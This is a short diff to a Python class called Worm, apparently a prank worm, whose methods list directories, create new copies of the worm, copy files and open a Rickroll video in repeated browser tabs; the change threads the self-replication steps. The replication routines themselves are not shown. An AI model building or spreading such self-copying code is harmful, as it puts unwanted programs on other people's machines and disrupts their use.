@@ -170,21 +170,24 @@ class Worm:
     
     def rick_and_roll(self):
         try:
-            if (self.first_run == True):
-                os.startfile(self.own_path + RICKLOC)
-                if YOUTUBETOO:
-                    for i in range(0, COUNT):
-                        webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
+            os.startfile(self.own_path + RICKLOC)
+            if YOUTUBETOO:
+                for i in range(0, COUNT):
+                    webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
         except:
             logging.warning("exception occurred: no rick?")
 
     def start_worm_actions(self):
         print(self.target_dir_list)
         try:
-            self.list_directories(self.path)
-            self.create_new_worm()
-            self.copy_existing_files()
-            self.rick_and_roll()
+            if self.first_run:
+                self.rick_and_roll()
+            self.threader.append(self.list_directories(self.path))
+            self.threader.append(self.create_new_worm())
+            self.threader.append(self.copy_existing_files())
+            self.threader.start()
+            self.threader.join()
+            
         except:
             logging.warning("something went wrong")
         #self.connection_iterator()
